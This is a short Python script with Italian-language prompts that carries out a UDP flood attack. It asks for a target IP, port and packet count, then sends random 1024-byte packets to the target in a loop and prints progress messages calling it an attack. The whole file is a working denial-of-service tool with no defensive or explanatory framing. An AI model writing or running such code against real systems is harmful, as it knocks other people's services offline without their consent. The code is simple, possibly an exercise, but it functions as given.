import socket as so
import random
import time

def generate_packet():
    return random._urandom(1024)

def udp_flood(target_ip, target_port, num_packets):
    try:
        sock = so.socket(so.AF_INET, so.SOCK_DGRAM)
        
        sent_packets = 0
        
        print(f"Inizio attacco UDP flood su {target_ip}:{target_port}")
        
        for _ in range(num_packets):
            packet = generate_packet()
            sock.sendto(packet, (target_ip, target_port))
            sent_packets += 1
            if sent_packets % 100 == 0:
                print(f"{sent_packets} pacchetti inviati.")
            
            time.sleep(0.01)
        
        print(f"\nAttacco completato. {sent_packets} pacchetti inviati al target.")
    
    except Exception as e:
        print(f"Errore: {e}")
    finally:
        sock.close()

def main():
    target_ip = input("Inserisci l'IP della macchina target: ")
    target_port = int(input("Inserisci la porta UDP della macchina target: "))
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
    
    udp_flood(target_ip, target_port, num_packets)

if __name__ == "__main__":
    main()
